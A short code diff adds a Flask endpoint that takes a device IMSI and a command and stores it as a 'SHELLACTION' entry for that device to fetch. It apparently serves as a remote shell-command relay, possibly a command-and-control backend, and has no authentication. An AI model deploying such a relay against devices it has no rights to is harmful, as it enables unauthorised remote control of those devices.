@@ -8,6 +8,25 @@ class Web(object):
     def start(self):
         app = Flask(__name__)
 
+        @app.route('/api/postsender', methods=['POST'])
+        def postapi():
+            data = request.json
+            imsi = data.get('imsi')
+            command = data.get('cmd')
+
+            payload = {
+                f"{imsi}": {
+                    "data": f"SHELLACTION{command}"
+                }
+            }
+
+            with open("./data/sendinfo.txt", 'w') as f:
+                ppayload = json.dumps(payload)
+                f.write(ppayload)
+                f.close()
+
+            return "ok"
+
         @app.route('/api/querysender')
         def sendapi():
             imsi = request.args.get("imsi")
